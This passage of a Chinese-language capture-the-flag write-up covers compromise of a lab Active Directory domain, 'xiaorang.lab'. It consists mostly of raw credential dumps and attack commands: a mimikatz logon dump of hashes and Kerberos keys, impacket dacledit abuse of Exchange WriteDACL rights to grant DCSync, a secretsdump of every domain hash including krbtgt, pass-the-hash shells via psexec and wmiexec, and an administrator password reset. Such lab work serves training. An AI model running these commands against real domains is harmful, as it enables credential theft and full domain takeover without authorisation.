         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
        tspkg :
        wdigest :
         * Username : Zhangtong
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : Zhangtong
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 23860 (00000000:00005d34)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:06
SID               :
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
        kerberos :
        ssp :
         [00000000]
         * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
         * Domain   : (null)
         * Password : 5aBkzHWo0qU7bNjY5Gj*]3/0*+/K5G&1O-1u&1YcEvR4g$[3S9]HXLxwm0weI=P]LtP|>Fd/8s[$@W;/dDNlj}vGO9tT7+D3MY}&WwCFa3nS2g?x{{$8qT}xETm5%EO$
        credman :

Authentication Id : 0 ; 10879977 (00000000:00a603e9)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/3/21 20:23:54
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
        msv :
         [00000003] Primary
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG
         * NTLM     : 85094afb325eec5f1cc955af42d5d36e
         * SHA1     : 815393a2917dad35e241b8bd80670445220bb399
         * DPAPI    : 7b7c5605e43b86b01d9a54b2144485c0
        tspkg :
        wdigest :
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 10870351 (00000000:00a5de4f)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/3/21 20:23:50
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
        msv :
         [00000003] Primary
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG
         * NTLM     : 85094afb325eec5f1cc955af42d5d36e
         * SHA1     : 815393a2917dad35e241b8bd80670445220bb399
         * DPAPI    : 7b7c5605e43b86b01d9a54b2144485c0
        tspkg :
        wdigest :
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : HealthMailbox0d5918e
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 10434731 (00000000:009f38ab)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : XIAORANG-EXC01
Logon Server      : XIAORANG-EXC01
Logon Time        : 2026/3/21 20:18:49
SID               : S-1-5-21-804691931-3750513266-524628342-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : XIAORANG-EXC01
         * NTLM     : 579da618cfbfa85247acf1f800a280a4
         * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : XIAORANG-EXC01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : XIAORANG-EXC01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 10427443 (00000000:009f1c33)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 20:18:48
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : ca 94 d0 83 ed 51 dd 31 5b 22 23 d6 8d ed 81 fc 0d 8f 59 02 3e 16 1d 6b 18 d9 97 c8 12 84 52 b9 c7 ec d4 e3 06 18 3b 7e a1 61 d8 18 4c dd bb f6 9d f6 0c 02 d2 28 64 10 89 d6 8c 99 c1 96 8a 06 34 1d d2 6e f3 7f 93 f2 e8 04 45 f5 46 b6 17 35 a0 3e 1c e0 c7 ac 53 2a c8 93 f9 dd 36 8c ad a8 e8 ad 5a 99 38 c3 63 14 53 52 7a a3 7f c0 e3 cc da d7 10 06 7b d0 f7 56 fd f0 e3 c6 81 55 8a be 96 86 10 42 85 cb 71 f6 2a 48 87 38 2c e9 3c 17 45 fb c4 9e c5 b9 26 dd cf 7e f7 1b 89 d6 d5 e6 2e 45 f3 78 fe 4d 21 09 42 6e 54 60 01 bd 26 49 7a 50 56 46 87 2d e3 2f 37 0f 61 4a 42 29 fb 07 dd 24 d0 2c 1b ac 94 81 16 75 18 9f 7e 2e 14 fe e5 e9 65 b9 19 16 5d 76 56 43 69 c4 92 5c a8 ea 97 67 d5 83 d9 a0 b7 4f 5b f3 c9 ac 04 c0 7c 8b
        ssp :
        credman :

Authentication Id : 0 ; 10427427 (00000000:009f1c23)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 20:18:48
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : ca 94 d0 83 ed 51 dd 31 5b 22 23 d6 8d ed 81 fc 0d 8f 59 02 3e 16 1d 6b 18 d9 97 c8 12 84 52 b9 c7 ec d4 e3 06 18 3b 7e a1 61 d8 18 4c dd bb f6 9d f6 0c 02 d2 28 64 10 89 d6 8c 99 c1 96 8a 06 34 1d d2 6e f3 7f 93 f2 e8 04 45 f5 46 b6 17 35 a0 3e 1c e0 c7 ac 53 2a c8 93 f9 dd 36 8c ad a8 e8 ad 5a 99 38 c3 63 14 53 52 7a a3 7f c0 e3 cc da d7 10 06 7b d0 f7 56 fd f0 e3 c6 81 55 8a be 96 86 10 42 85 cb 71 f6 2a 48 87 38 2c e9 3c 17 45 fb c4 9e c5 b9 26 dd cf 7e f7 1b 89 d6 d5 e6 2e 45 f3 78 fe 4d 21 09 42 6e 54 60 01 bd 26 49 7a 50 56 46 87 2d e3 2f 37 0f 61 4a 42 29 fb 07 dd 24 d0 2c 1b ac 94 81 16 75 18 9f 7e 2e 14 fe e5 e9 65 b9 19 16 5d 76 56 43 69 c4 92 5c a8 ea 97 67 d5 83 d9 a0 b7 4f 5b f3 c9 ac 04 c0 7c 8b
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:24
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 66203 (00000000:0001029b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:22
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : 9587463cfa3fd1ea760c401e2c52e224
         * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : 12 ae e6 f2 22 80 c0 a3 cd 84 c9 94 de ef 96 52 79 ff ea 99 f6 9c 67 48 10 08 e7 99 1a fa 51 11 ad b6 c1 79 cc 6d 04 b2 22 01 47 b0 53 b5 7e ff df 04 21 34 ae 7b ee c9 cf b1 c1 d3 c0 63 d3 d7 6a f2 3a 38 83 ac cf d2 93 7b d3 0b bb d6 a5 8d 7c cd f1 77 65 0b 8c 77 dd 98 49 3c 21 f0 5d fc a7 8f c7 e0 5b f7 96 4d d2 46 14 81 8f 4f a7 a4 27 11 09 03 f9 f4 0d ce 71 4d 8d 64 c3 a9 6b 5c 4a 77 ba ac 33 1a 49 60 11 bd 4d b2 1e 98 05 1a c1 03 5b c6 cf 4e 1c d3 83 10 52 51 68 c4 b1 e0 65 c2 36 f3 a6 3f 66 c6 95 8c 3d 47 ab 9b cb 35 bd 53 f0 6f 13 ae 48 28 5e cf 5b ee 45 ce 7f 10 47 aa e6 f0 d3 09 c0 b3 ad ef 24 00 c5 c8 f0 7f a5 06 93 0e f5 a4 2a ec d0 25 96 4d a4 88 d3 55 94 d9 94 81 ef 8b ba 9e 89 b6 36 dc 88 64 8d 96
        ssp :
        credman :

Authentication Id : 0 ; 65976 (00000000:000101b8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:22
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : XIAORANG-EXC01$
         * Domain   : xiaorang.lab
         * Password : ca 94 d0 83 ed 51 dd 31 5b 22 23 d6 8d ed 81 fc 0d 8f 59 02 3e 16 1d 6b 18 d9 97 c8 12 84 52 b9 c7 ec d4 e3 06 18 3b 7e a1 61 d8 18 4c dd bb f6 9d f6 0c 02 d2 28 64 10 89 d6 8c 99 c1 96 8a 06 34 1d d2 6e f3 7f 93 f2 e8 04 45 f5 46 b6 17 35 a0 3e 1c e0 c7 ac 53 2a c8 93 f9 dd 36 8c ad a8 e8 ad 5a 99 38 c3 63 14 53 52 7a a3 7f c0 e3 cc da d7 10 06 7b d0 f7 56 fd f0 e3 c6 81 55 8a be 96 86 10 42 85 cb 71 f6 2a 48 87 38 2c e9 3c 17 45 fb c4 9e c5 b9 26 dd cf 7e f7 1b 89 d6 d5 e6 2e 45 f3 78 fe 4d 21 09 42 6e 54 60 01 bd 26 49 7a 50 56 46 87 2d e3 2f 37 0f 61 4a 42 29 fb 07 dd 24 d0 2c 1b ac 94 81 16 75 18 9f 7e 2e 14 fe e5 e9 65 b9 19 16 5d 76 56 43 69 c4 92 5c a8 ea 97 67 d5 83 d9 a0 b7 4f 5b f3 c9 ac 04 c0 7c 8b
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:06
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : xiaorang-exc01$
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2078007 (00000000:001fb537)
Session           : RemoteInteractive from 2
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/3/21 19:45:12
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
        msv :
         [00000003] Primary
         * Username : Zhangtong
         * Domain   : XIAORANG
         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
        tspkg :
        wdigest :
         * Username : Zhangtong
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : Zhangtong
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:22
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : b5d5d2a6ab2bc5cf19f330caf7795be9
         * SHA1     : a5326a240fffa8d11bf708f7224dc2b3bc04e2a4
        tspkg :
        wdigest :
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : xiaorang-exc01$
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 102826 (00000000:000191aa)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/3/21 19:43:23
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
        msv :
         [00000003] Primary
         * Username : Zhangtong
         * Domain   : XIAORANG
         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
        tspkg :
        wdigest :
         * Username : Zhangtong
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : Zhangtong
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/3/21 19:43:22
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

```

Zhangtong ntlm：22c7f81993e96ac83ac2f3f1903de8b4

找到dc机器的路径

![image-20260321202628546](image-20260321202628546.png)

ESC01$ 这台主机属于 EXCHANG TRUST SUBSYSTEM 组，这个组对 ENTERPRISE KEY ADMINS 组有 WriteDACL 权限，而 ENTERPRISE KEY ADMINS 组可以DCSync，那么只需要利用 ESC01$ 给 zhangtong 赋予 DCSync 权限即可

```
E:\exploit\impacket\examples>python dacledit.py "xiaorang.lab/XIAORANG-EXC01$"  -hashes ":b5d5d2a6ab2bc5cf19f330caf7795be9" -action "write" -rights "DCSync" -principal "zhangtong" -dc-ip 172.22.3.2 -target-dn "DC=xiaorang,DC=lab"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260321-210014.bak
[*] DACL modified successfully!

E:\exploit\impacket\examples>python secretsdump.py xiaorang.lab/zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:53ad00cc1ba329e254c26c949c670438:::
xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:85094afb325eec5f1cc955af42d5d36e:::
xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::
xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::
xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::
xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::
xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::
xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::
xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::
xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::
xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::
xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::
Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::
XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:fba7bb34b49e2d4e939295e3cdaa2552:::
XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:b5d5d2a6ab2bc5cf19f330caf7795be9:::
XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:8d1f87fce3b07ce95a210e1fa00d9afa:::
[*] Kerberos keys grabbed
xiaorang.lab\Administrator:aes256-cts-hmac-sha1-96:d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630
xiaorang.lab\Administrator:aes128-cts-hmac-sha1-96:8b17084cfa8d1c1d37c13201d68ec0cf
xiaorang.lab\Administrator:des-cbc-md5:d9c4a4d5348f0d73
krbtgt:aes256-cts-hmac-sha1-96:951d91f55df01d8e3013f433c695fd9684ac2f9f5c08fa815f751c894ca749f9
krbtgt:aes128-cts-hmac-sha1-96:7aa1c6c1f4080fdbf150cf5b6385c480
krbtgt:des-cbc-md5:700d434046231a9e
xiaorang.lab\HealthMailbox8446c5b:aes256-cts-hmac-sha1-96:e49ba1e509cf28d5bea3b43ca80d83912e2830b790da335f9823708e1c82a621
xiaorang.lab\HealthMailbox8446c5b:aes128-cts-hmac-sha1-96:a6282fed0fe8ce4224ace3fb5279879a
xiaorang.lab\HealthMailbox8446c5b:des-cbc-md5:8a4c29f80264c4d3
xiaorang.lab\HealthMailbox0d5918e:aes256-cts-hmac-sha1-96:82c70dfbe5d9d9c865d73f3a6f88d9beb344aa308eedc91dbe4af3477cd9df85
xiaorang.lab\HealthMailbox0d5918e:aes128-cts-hmac-sha1-96:89091164d695b820711c9b6942ac8721
xiaorang.lab\HealthMailbox0d5918e:des-cbc-md5:2fab9ec25bb334fb
xiaorang.lab\HealthMailboxeda7a84:aes256-cts-hmac-sha1-96:0dfb6bdfa6f3592f55baf1c228686597e00b1361eca1441a1fdf0c3599507fd7
xiaorang.lab\HealthMailboxeda7a84:aes128-cts-hmac-sha1-96:f20b096f3ad270e4c36876fd0f1f4a09
xiaorang.lab\HealthMailboxeda7a84:des-cbc-md5:3458ec32a815ce0b
xiaorang.lab\HealthMailbox33b01cf:aes256-cts-hmac-sha1-96:801e2feead7ae5074578fad5eac0d3dabd92f0445068e0a69232ce5bd8ca76f4
xiaorang.lab\HealthMailbox33b01cf:aes128-cts-hmac-sha1-96:3136e1be7138a8d29fa10bc3f2cf6f99
xiaorang.lab\HealthMailbox33b01cf:des-cbc-md5:3283a2dc518680f7
xiaorang.lab\HealthMailbox9570292:aes256-cts-hmac-sha1-96:f3aba1d52f3131e46d916fbd04817b43281b76b86b56dad24f808538e91363cc
xiaorang.lab\HealthMailbox9570292:aes128-cts-hmac-sha1-96:ee9802236d43d7e5695190232c044d63
xiaorang.lab\HealthMailbox9570292:des-cbc-md5:37d30719e940d679
xiaorang.lab\HealthMailbox3479a75:aes256-cts-hmac-sha1-96:721d8bcbbe316a0ec1a7f0aa3ce3519b4d7c3281a571e900b41384e5583d2c84
xiaorang.lab\HealthMailbox3479a75:aes128-cts-hmac-sha1-96:18353920e23e46ef0a834fe5cd5a481b
xiaorang.lab\HealthMailbox3479a75:des-cbc-md5:8a3d2cf261386ba8
xiaorang.lab\HealthMailbox2d45c5b:aes256-cts-hmac-sha1-96:ff6aac30c110e42185c90561d0befebb0b462553737d05aec9c6dcb660612ffd
xiaorang.lab\HealthMailbox2d45c5b:aes128-cts-hmac-sha1-96:5117b1a04caa9925f508eeb0bd6ffa35
xiaorang.lab\HealthMailbox2d45c5b:des-cbc-md5:df2ca48c1525dccb
xiaorang.lab\HealthMailboxec2d542:aes256-cts-hmac-sha1-96:a63a5cb34f7d503c61af2a96508ed826b0ad4daf10198f2b709b75bc58789e90
xiaorang.lab\HealthMailboxec2d542:aes128-cts-hmac-sha1-96:bfe7ece929174b6ba1d643e87f37cf7a
xiaorang.lab\HealthMailboxec2d542:des-cbc-md5:5bf42601e608df31
xiaorang.lab\HealthMailboxf5f7dbd:aes256-cts-hmac-sha1-96:824ea1eadc05dc8b0ed26c3ff0696c9e2fc145ad2d08dd5dbb1c6428f4eb074f
xiaorang.lab\HealthMailboxf5f7dbd:aes128-cts-hmac-sha1-96:c62918a735c4fde6b5db99d9c441200c
xiaorang.lab\HealthMailboxf5f7dbd:des-cbc-md5:46e654e5649d6732
xiaorang.lab\HealthMailbox67dc103:aes256-cts-hmac-sha1-96:c439db29ecbe032623449f1298a0537e6ed26c71dbd457574ac710c0e7c175e4
xiaorang.lab\HealthMailbox67dc103:aes128-cts-hmac-sha1-96:a952200f4f439c33c289f5a5408f902b
xiaorang.lab\HealthMailbox67dc103:des-cbc-md5:751013ef3ee36225
xiaorang.lab\HealthMailbox320fc73:aes256-cts-hmac-sha1-96:a00af0ea0627c6497a806ebcd11c432f7c9658044ca4947438bfca3e371a8363
xiaorang.lab\HealthMailbox320fc73:aes128-cts-hmac-sha1-96:af5f9c02443cef462bb6b5456b296d60
xiaorang.lab\HealthMailbox320fc73:des-cbc-md5:1949dc2c7c98bc20
xiaorang.lab\Lumia:aes256-cts-hmac-sha1-96:25e42c5502cfc032897686857062bba71a6b845a3005c467c9aeebf10d3fa850
xiaorang.lab\Lumia:aes128-cts-hmac-sha1-96:1f95632f869be1726ff256888e961775
xiaorang.lab\Lumia:des-cbc-md5:313db53e68ecf4ce
Zhangtong:aes256-cts-hmac-sha1-96:ae16478a2d05fedf251d0050146d8d2e24608aa3d95f014acd5acb9eb8896bd5
Zhangtong:aes128-cts-hmac-sha1-96:970b0820700dfa60e2c7c1af1d4bbdd1
Zhangtong:des-cbc-md5:9b61b3583140c4b5
XIAORANG-WIN16$:aes256-cts-hmac-sha1-96:05acd4e5073121ab3532ef5a0a754590bdcd17f249010323c10e2b00919d3803
XIAORANG-WIN16$:aes128-cts-hmac-sha1-96:eb894cc89504fbb8e950361cfc6f25ab
XIAORANG-WIN16$:des-cbc-md5:9b0883494954ce32
XIAORANG-EXC01$:aes256-cts-hmac-sha1-96:419613eca7c9cf2b4c7e3de18ed3bb9b66fb47be95a49ce13a9042ee802855a2
XIAORANG-EXC01$:aes128-cts-hmac-sha1-96:de02588cd5247039429bf3756e3e1c2d
XIAORANG-EXC01$:des-cbc-md5:6413cd13cbade06e
XIAORANG-PC$:aes256-cts-hmac-sha1-96:7a0fe5cf1516c1babfd0f4e902439436f06e163c2b7905db8af5c11d2b6d1931
XIAORANG-PC$:aes128-cts-hmac-sha1-96:9882411ac0fa2756cd4011b5e71532a9
XIAORANG-PC$:des-cbc-md5:ea4945679b20a861
[*] Cleaning up...
```

```
E:\exploit\impacket\examples>python psexec.py xiaorang.lab/administrator@172.22.3.2 -hashes aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 172.22.3.2.....
[*] Found writable share ADMIN$
[*] Uploading file KGgAcNhg.exe
[*] Opening SVCManager on 172.22.3.2.....
[*] Creating service rZHl on 172.22.3.2.....
[*] Starting service rZHl.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.14393]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2016 Microsoft Corporation����������Ȩ����


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir c:\users\administrator
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 ������ C �еľ�û�б�ǩ��

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 �������к��� 0637-3CEF


[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 c:\users\administrator ��Ŀ¼


2022/10/23  21:34    <DIR>          .
2022/10/23  21:34    <DIR>          ..
2022/10/23  14:34    <DIR>          Contacts
2022/10/23  14:34    <DIR>          Desktop
2022/10/23  14:34    <DIR>          Documents
2022/10/23  14:34    <DIR>          Downloads
2022/10/23  14:34    <DIR>          Favorites
2022/10/23  21:34    <DIR>          flag
2022/10/23  14:34    <DIR>          Links
2022/10/23  14:34    <DIR>          Music
2022/10/23  14:34    <DIR>          Pictures
2022/10/23  14:34    <DIR>          Saved Games
2022/10/23  14:34    <DIR>          Searches
2022/10/23  14:34    <DIR>          Videos
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
               0 ���ļ�              0 �ֽ�

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
              14 ��Ŀ¼ 28,649,881,600 �����ֽ�


C:\Windows\system32> type  c:\users\administrator\flag\f*

c:\users\administrator\flag\flag.txt


____  ___.___   _____   ________ __________    _____    _______    ________
\   \/  /|   | /  _  \  \_____  \\______   \  /  _  \   \      \  /  _____/
 \     / |   |/  /_\  \  /   |   \|       _/ /  /_\  \  /   |   \/   \  ___
 /     \ |   /    |    \/    |    \    |   \/    |    \/    |    \    \_\  \
/___/\  \|___\____|__  /\_______  /____|_  /\____|__  /\____|__  /\______  /
      \_/            \/         \/       \/         \/         \/        \/



flag04: flag{1667a866-097a-40f3-b3e7-dd75c00352f0}
```



```
E:\exploit\impacket\examples>python wmiexec.py "xiaorang.lab/administrator@172.22.3.26" -hashes ":7acbc09a6c0efd81bfa7d5a1d4238beb"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\administrator

C:\>net user administrator admin@123
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
����ɹ���ɡ�
```

rdp上去Lumia\Desktop 目录下找到一个 secret.zip

要密码

